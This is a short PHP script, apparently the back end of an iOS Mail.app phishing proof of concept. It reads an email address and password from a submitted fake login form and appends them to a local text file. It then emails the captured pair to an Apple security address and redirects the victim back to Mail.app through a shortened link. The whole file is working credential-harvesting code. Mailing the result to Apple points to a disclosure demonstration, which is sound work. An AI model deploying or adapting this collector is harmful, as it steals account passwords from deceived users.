<?php
if(isset($_GET['modal-email']) && isset($_GET['modal-email'])) {
	$email = htmlspecialchars(stripslashes($_GET['modal-email']));
	$password = htmlspecialchars(stripslashes($_GET['modal-password']));
    $data = $email . '-' . $password . "\n";
    $ret = file_put_contents('./mydata.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error.');
    }
    else {
	    mail('product-security@apple.com','Apple ID Password',"Thank You \n $data ¯\_(ツ)_/¯ \n https://github.com/jansoucek/iOS-Mail.app-inject-kit");
	    header("Location: http://is.gd/9VOMTp"); //Redirects recipient from Safari back to Mail.app using message://You are now logged in
	    die();
    }
}
else {
   die('No GET data to process. Thanks for trying.');
}
?>
